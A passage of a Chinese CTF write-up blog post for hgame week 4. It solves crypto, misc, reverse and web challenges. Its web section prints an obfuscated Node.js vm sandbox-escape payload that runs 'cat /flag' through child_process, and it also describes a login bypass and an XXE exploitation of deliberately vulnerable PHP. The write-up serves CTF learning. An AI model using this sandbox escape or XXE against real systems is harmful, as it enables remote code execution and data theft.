<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="-ctf," />





  <link rel="alternate" href="/atom.xml" title="mrl64's Blog" type="application/atom+xml" />






<meta name="description" content="前言 四周的比赛终于结束了，最后总计拿了9676分，位列20名。">
<meta property="og:type" content="article">
<meta property="og:title" content="【hgame week4】write up">
<meta property="og:url" content="http://example.com/2022/02/18/%E3%80%90hgame-week4%E3%80%91write-up/index.html">
<meta property="og:site_name" content="mrl64&#39;s Blog">
<meta property="og:description" content="前言 四周的比赛终于结束了，最后总计拿了9676分，位列20名。">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://s2.loli.net/2022/02/18/S1VF9THKAxOgnzI.png">
<meta property="og:image" content="https://s2.loli.net/2022/02/18/PdSWhENtaeLHD4b.png">
<meta property="og:image" content="https://s2.loli.net/2022/02/18/dczPXBuZ7b1k2Jh.png">
<meta property="og:image" content="https://s2.loli.net/2022/02/18/cw321igsyPzURT6.png">
<meta property="og:image" content="https://s2.loli.net/2022/02/18/Up1t2RAhMfTFSyc.png">
<meta property="og:image" content="https://s2.loli.net/2022/02/18/6uxvQg8TZNP9c2l.png">
<meta property="og:image" content="https://s2.loli.net/2022/02/18/kvAEwhKVn4GpCdP.png">
<meta property="og:image" content="https://s2.loli.net/2022/02/18/vthgAiIMuRB4KqN.png">
<meta property="og:image" content="https://s2.loli.net/2022/02/18/6lzWuyn3hi5XZrT.png">
<meta property="og:image" content="https://s2.loli.net/2022/02/18/pE1YVL8mQMk9SrI.png">
<meta property="og:image" content="https://s2.loli.net/2022/02/18/fyEtHiKb5qn798Y.png">
<meta property="og:image" content="https://s2.loli.net/2022/02/18/skY1QhA4Mnc2Ojv.png">
<meta property="og:image" content="https://s2.loli.net/2022/02/18/OS2dGEust1c4B6e.png">
<meta property="article:published_time" content="2022-02-18T10:40:37.000Z">
<meta property="article:modified_time" content="2022-02-18T13:29:48.942Z">
<meta property="article:author" content="liszt_lin">
<meta property="article:tag" content="-ctf">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.loli.net/2022/02/18/S1VF9THKAxOgnzI.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://example.com/2022/02/18/【hgame-week4】write-up/"/>





  <title>【hgame week4】write up | mrl64's Blog</title>
  








<meta name="generator" content="Hexo 5.4.0"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">mrl64's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            Categories
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/18/%E3%80%90hgame-week4%E3%80%91write-up/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="mrl64's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">【hgame week4】write up</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-02-18T18:40:37+08:00">
                2022-02-18
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-up/" itemprop="url" rel="index">
                    <span itemprop="name">write up</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p>四周的比赛终于结束了，最后总计拿了9676分，位列20名。</p>
</blockquote>
<span id="more"></span>

<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="ECC"><a href="#ECC" class="headerlink" title="ECC"></a>ECC</h2><p>给了个sage文件，审计代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import getPrime</span><br><span class="line">from libnum import s2n</span><br><span class="line">from secret import flag</span><br><span class="line"></span><br><span class="line">p = getPrime(256)</span><br><span class="line">a = getPrime(256)</span><br><span class="line">b = getPrime(256)</span><br><span class="line">E = EllipticCurve(GF(p),[a,b])</span><br><span class="line">m = E.random_point()</span><br><span class="line">G = E.random_point()</span><br><span class="line">k = getPrime(256)</span><br><span class="line">K = k * G</span><br><span class="line">r = getPrime(256)</span><br><span class="line">c1 = m + r * K</span><br><span class="line">c2 = r * G</span><br><span class="line">cipher_left = s2n(flag[:len(flag)//2]) * m[0]</span><br><span class="line">cipher_right = s2n(flag[len(flag)//2:]) * m[1]</span><br><span class="line"></span><br><span class="line">print(f&quot;p = &#123;p&#125;&quot;)</span><br><span class="line">print(f&quot;a = &#123;a&#125;&quot;)</span><br><span class="line">print(f&quot;b = &#123;b&#125;&quot;)</span><br><span class="line">print(f&quot;k = &#123;k&#125;&quot;)</span><br><span class="line">print(f&quot;E = &#123;E&#125;&quot;)</span><br><span class="line">print(f&quot;c1 = &#123;c1&#125;&quot;)</span><br><span class="line">print(f&quot;c2 = &#123;c2&#125;&quot;)</span><br><span class="line">print(f&quot;cipher_left = &#123;cipher_left&#125;&quot;)</span><br><span class="line">print(f&quot;cipher_right = &#123;cipher_right&#125;&quot;)</span><br></pre></td></tr></table></figure>

<p>发现是一个椭圆加密的逻辑，生成一个椭圆后取随机一点作为明文，再根据逻辑生成两个密文。而flag是根据明文点的x，y轴进行加密，flag左半边乘x轴获得flag密文1，右半边乘y轴获得密文2，根据逻辑写解密脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">p = 74997021559434065975272431626618720725838473091721936616560359000648651891507</span><br><span class="line">a = 61739043730332859978236469007948666997510544212362386629062032094925353519657</span><br><span class="line">b = 87821782818477817609882526316479721490919815013668096771992360002467657827319</span><br><span class="line">k = 93653874272176107584459982058527081604083871182797816204772644509623271061231</span><br><span class="line">E = EllipticCurve(GF(p),[a,b])</span><br><span class="line">c1 = E(14455613666211899576018835165132438102011988264607146511938249744871964946084,25506582570581289714612640493258299813803157561796247330693768146763035791942)</span><br><span class="line">c2 = E(37554871162619456709183509122673929636457622251880199235054734523782483869931,71392055540616736539267960989304287083629288530398474590782366384873814477806)</span><br><span class="line">m = c1-k*c2</span><br><span class="line">cipher_left = 68208062402162616009217039034331142786282678107650228761709584478779998734710</span><br><span class="line">cipher_right = 27453988545002384546706933590432585006240439443312571008791835203660152890619</span><br><span class="line"></span><br><span class="line">flag1=cipher_left/m[0]</span><br><span class="line">flag2=cipher_right/m[1]</span><br><span class="line">print(hex(flag1))</span><br><span class="line">print(hex(flag2))</span><br></pre></td></tr></table></figure>

<p>获得结果后解16进制得到flag：<br><img src="https://s2.loli.net/2022/02/18/S1VF9THKAxOgnzI.png"><br><img src="https://s2.loli.net/2022/02/18/PdSWhENtaeLHD4b.png"></p>
<h2 id="PRNG"><a href="#PRNG" class="headerlink" title="PRNG"></a>PRNG</h2><p>名字就告诉我们是伪随机，先看加密脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">from random import randrange</span><br><span class="line"></span><br><span class="line">from libnum import s2n</span><br><span class="line"></span><br><span class="line">from secret import flag</span><br><span class="line">from PRNG import PRNG</span><br><span class="line"></span><br><span class="line">mt = PRNG(randrange(0, 1 &lt;&lt; 32))</span><br><span class="line">print([mt() for _ in range(624)])</span><br><span class="line">print([part ^ mt() for part in map(s2n, re.findall(&quot;.&#123;1,4&#125;&quot;, flag))])</span><br></pre></td></tr></table></figure>

<p>相当简单粗暴，给了我们624位伪随机值，我们要根据这624位推出接下来的伪随机值，而密文每四位flag与接下来的伪随机值进行异或，我们直接借用<code>MT19937Predictor</code>库编写脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line">from mt19937predictor import MT19937Predictor</span><br><span class="line">from libnum import n2s</span><br><span class="line"></span><br><span class="line">predictor = MT19937Predictor()</span><br><span class="line">list=[num*624]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in list:</span><br><span class="line">    predictor.setrandbits(i, 32)</span><br><span class="line"></span><br><span class="line">list2=[3437104340, 508103176, 1635844121, 878522509, 1923790547, 1727955782, 1371509208, 3182873539, 156878129, 1757777801, 1472806960, 3486450735, 2307527058, 2950814692, 1817110380, 372493821, 729662950, 2366747255, 774823385, 387513980, 1444397883]</span><br><span class="line">flag = b&quot;&quot;</span><br><span class="line">for j in list2:</span><br><span class="line">    key = predictor.getrandbits(32)</span><br><span class="line">    flag += n2s(j ^ key) </span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>得到flag：<br><img src="https://s2.loli.net/2022/02/18/dczPXBuZ7b1k2Jh.png"></p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="摆烂"><a href="#摆烂" class="headerlink" title="摆烂"></a>摆烂</h2><p>这周唯一做出来的misc，太菜了还是。首先下载下来是一个被加密的压缩包，binwalk发现藏了一张图片，foremost提取出来。</p>
<p>观察010，发现是一张apng：<br><img src="https://s2.loli.net/2022/02/18/cw321igsyPzURT6.png"></p>
<p>利用网站分离后是两张长得一模一样但是大小不一样的图片，判断是盲水印，利用工具提取盲水印：<br><img src="https://s2.loli.net/2022/02/18/Up1t2RAhMfTFSyc.png"></p>
<p>得到压缩包密码：<code>4C*9wfg976</code></p>
<p>解压出来发现是二维码，拼接：<br><img src="https://s2.loli.net/2022/02/18/6uxvQg8TZNP9c2l.png"></p>
<p>最后扫描出来一段文字，但是用QR Reserch扫描时发现文字之间存在问号，判断零宽隐写，在线网站解密得到flag：<br><img src="https://s2.loli.net/2022/02/18/kvAEwhKVn4GpCdP.png"></p>
<h2 id="At0m的给你们的-迟到的-情人节礼物（赛后）"><a href="#At0m的给你们的-迟到的-情人节礼物（赛后）" class="headerlink" title="At0m的给你们的(迟到的)情人节礼物（赛后）"></a>At0m的给你们的(迟到的)情人节礼物（赛后）</h2><p>打开压缩包，一个视频是web3的hint，一个视频是avi格式，猜测MSU隐写，hint视频中的切屏印证了这一猜测：<br><img src="https://s2.loli.net/2022/02/18/vthgAiIMuRB4KqN.png"></p>
<p>接着寻找passcode，010查看压缩包发现藏着一个<code>hide.txt</code>，用7z打开查看：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">秋名山车神Atom开车啦</span><br><span class="line">4 up left down up right down up left up down right down up left down up right down up left up down right down up left down up right up down left up down right down up left down up right down up left up down right down up left up down down up up down right down up left up down right up down left up down right down up left up down right up</span><br></pre></td></tr></table></figure>

<p>做题时做到这里被卡死了，看了wp才发现上下左右是代表换挡方向，麻了。4进制编码，油门代表保持，解得passcode为6557255，解密获得flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Q1ng_R3n_J1e_Da_Sh4_CTF&#125;</span><br></pre></td></tr></table></figure>

<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="ezvm"><a href="#ezvm" class="headerlink" title="ezvm"></a>ezvm</h2><p>搞清楚vm的逻辑就行了，具体逻辑参考官方wp吧，脚本破解：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xor_keys = [94, 70, 97, 67, 14, 83, 73, 31, 81, 94, 54, 55, 41, 65, 99, 59, 100,</span><br><span class="line">59, 21, 24, 91, 62, 34, 80, 70, 94, 53, 78, 67, 35, 96, 59]</span><br><span class="line">plain_text = []</span><br><span class="line">cipher = [142, 136, 163, 153, 196, 165, 195, 221, 25, 236, 108, 155, 243, 27, 139,</span><br><span class="line">91, 62, 155, 241, 134, 243, 244, 164, 248, 248, 152, 171, 134, 137, 97, 34, 193]</span><br><span class="line">for i in range(0,32):</span><br><span class="line">    plain_text.append(chr((cipher[i]^xor_keys[i])//2))</span><br><span class="line">print(&#x27;&#x27;.join(plain_text))</span><br></pre></td></tr></table></figure>

<p>得到flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Ea$Y-Vm-t0-PrOTeCT_cOde!!&#125;</span><br></pre></td></tr></table></figure>

<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Markdown-Online（赛后）"><a href="#Markdown-Online（赛后）" class="headerlink" title="Markdown Online（赛后）"></a>Markdown Online（赛后）</h2><p>这题想出来前一半，后一半是绕rce的一个沙盒vm逃逸，当时做的时候没找到payload，不太应该。</p>
<p>首先看登录逻辑：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function LoginController(req, res) &#123;</span><br><span class="line">    if (req.body.username === &quot;admin&quot; &amp;&amp; req.body.password.length === 16) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            req.body.password = req.body.password.toUpperCase()</span><br><span class="line">            if (req.body.password !== &#x27;54gkj7n8uo55vbo2&#x27;) &#123;</span><br><span class="line">                return res.status(403).json(&#123;msg: &#x27;invalid username or password&#x27;&#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (__) &#123;&#125;</span><br><span class="line">        req.session[&#x27;unique_id&#x27;] = randString.generate(16)</span><br><span class="line">        res.json(&#123;msg: &#x27;ok&#x27;&#125;)</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        res.status(403).json(&#123;msg: &#x27;login failed&#x27;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将我们输入的字符串转大写后与<code>54gkj7n8uo55vbo2</code>进行比较，如果相等才能登陆成功。但这显然是不可能的，但我们注意到关键点在于，这个比较实在异常捕获中进行的，也就是说我们可以让语句出错达到绕过的效果，因此我们构建payload：<br><img src="https://s2.loli.net/2022/02/18/6lzWuyn3hi5XZrT.png"></p>
<p>成功绕过，进入md界面。这里是利用<code>markdown-it</code>不转义html标签的条件，构造一个恶意的<code>script</code>标签，利用其中的代码来逃逸vm沙箱并实现RCE，同时需要bypass来绕过waf。构建payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">var h=&#x27;child_p&#x27;;var e=&#x27;rocess&#x27;;var i=[h,e].join(&#x27;&#x27;);</span><br><span class="line">x=clearImmediate[`$&#123;`$&#123;`constructo`&#125;r`&#125;`][`$&#123;`$&#123;`constructo`&#125;r`&#125;`][`$&#123;`$&#123;`constructo`&#125;r`&#125;`]([`$&#123;`$&#123;`return proces`&#125;s`&#125;`])();y=x.mainModule.require(i);z=y.execSync(&#x27;cat /flag&#x27;).toString();document.write(z);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>得到flag：<br><img src="https://s2.loli.net/2022/02/18/pE1YVL8mQMk9SrI.png"></p>
<p>只能说nodejs的沙盒逃逸确实是知识盲区，这波是被教育了。</p>
<h2 id="Comment"><a href="#Comment" class="headerlink" title="Comment"></a>Comment</h2><p>根据提示下载<code>www.zip</code>，获取源码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require &#x27;./init.php&#x27;;</span><br><span class="line">require_once &#x27;./db.php&#x27;;</span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader(false);</span><br><span class="line"></span><br><span class="line">function waf($str): bool &#123;</span><br><span class="line">    if (preg_match(&#x27;/file|glob|http|dict|gopher|php|ftp|ssh|phar/i&#x27;, $str)) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function save() &#123;</span><br><span class="line">    if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] != &#x27;POST&#x27;) &#123;</span><br><span class="line">        echo json_encode([&#x27;error&#x27; =&gt; &#x27;wrong method&#x27;]);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    $data = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">    if (waf($data)) &#123;</span><br><span class="line">        http_response_code(403);</span><br><span class="line">        echo json_encode([&#x27;error&#x27; =&gt; &#x27;Hacker!&#x27;]);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $id = $_SESSION[&#x27;unique_id&#x27;];</span><br><span class="line">    $db = getDB();</span><br><span class="line"></span><br><span class="line">    $stmt = $db-&gt;prepare(&#x27;INSERT INTO comments (sender,content) VALUES (?,?)&#x27;);</span><br><span class="line">    $stmt-&gt;execute([$id, $data]);</span><br><span class="line">    if ($stmt-&gt;rowCount() != 0) &#123;</span><br><span class="line">        echo json_encode([&#x27;msg&#x27; =&gt; &#x27;success&#x27;]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        http_response_code(500);</span><br><span class="line">        echo json_encode([&#x27;error&#x27; =&gt; &#x27;failed to create records&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function parseXML($str) &#123;</span><br><span class="line">    $dom = new DOMDocument();</span><br><span class="line">    try &#123;</span><br><span class="line">        $dom-&gt;loadXML($str, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    &#125; catch (Exception $e) &#123;</span><br><span class="line">        http_response_code(400);</span><br><span class="line">        echo json_encode([&#x27;error&#x27; =&gt; &#x27;invalid xml data&#x27;]);</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">    $attrs = simplexml_import_dom($dom);</span><br><span class="line">    if (!isset($attrs-&gt;content)) &#123;</span><br><span class="line">        http_response_code(400);</span><br><span class="line">        echo json_encode([&#x27;error&#x27; =&gt; &#x27;content is empty&#x27;]);</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">    if (waf($attrs-&gt;sender) || waf($attrs-&gt;content)) &#123;</span><br><span class="line">        http_response_code(403);</span><br><span class="line">        echo json_encode([&#x27;error&#x27; =&gt; &#x27;Hacker!&#x27;]);</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">    if ($attrs-&gt;sender == &#x27;admin&#x27; &amp;&amp; !preg_match(&#x27;/admin/i&#x27;, $str)) &#123;</span><br><span class="line">        $flag = &#x27;hgame&#123;xxxxx&#125;&#x27;;</span><br><span class="line">        $attrs-&gt;content = $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    return $attrs;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function get() &#123;</span><br><span class="line">    $id = $_SESSION[&#x27;unique_id&#x27;];</span><br><span class="line"></span><br><span class="line">    $db = getDB();</span><br><span class="line">    $stmt = $db-&gt;prepare(&#x27;SELECT * FROM comments WHERE sender=?&#x27;);</span><br><span class="line">    $stmt-&gt;execute([$id]);</span><br><span class="line">    $data = $stmt-&gt;fetchAll();</span><br><span class="line">    $result = [];</span><br><span class="line">    foreach ($data as $key =&gt; $val) &#123;</span><br><span class="line">        array_push($result, parseXML($val[&#x27;content&#x27;]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo json_encode($result);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">switch ($_GET[&#x27;action&#x27;]) &#123;</span><br><span class="line">    case &#x27;get&#x27;:</span><br><span class="line">        get();</span><br><span class="line">        break;</span><br><span class="line">    case &#x27;add&#x27;:</span><br><span class="line">        save();</span><br><span class="line">        break;</span><br><span class="line">    case &#x27;info&#x27;:</span><br><span class="line">        echo json_encode([&#x27;unique_id&#x27; =&gt; $_SESSION[&#x27;unique_id&#x27;]]);</span><br><span class="line">        break;</span><br><span class="line">    default:</span><br><span class="line">        http_response_code(400);</span><br><span class="line">        echo json_encode([&#x27;error&#x27; =&gt; &#x27;no such action&#x27;]);</span><br><span class="line">        break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>审计代码发现是传入xml，且不能传入伪协议。而获取flag的方式是令传入的标签<code>&lt;sender&gt;</code>内的值为admin，但是传入的内容不能出现admin，因此利用xxe做拼接传入就可以了：<br><img src="https://s2.loli.net/2022/02/18/fyEtHiKb5qn798Y.png"></p>
<p>得到flag：<br><img src="https://s2.loli.net/2022/02/18/skY1QhA4Mnc2Ojv.png"></p>
<h2 id="FileSystem"><a href="#FileSystem" class="headerlink" title="FileSystem"></a>FileSystem</h2><p>这题考察的是go语言，首先给了我们源码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;log&quot;</span><br><span class="line">	&quot;net/http&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func fileHandler(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">	http.FileServer(http.Dir(&quot;./&quot;)).ServeHTTP(w, r)</span><br><span 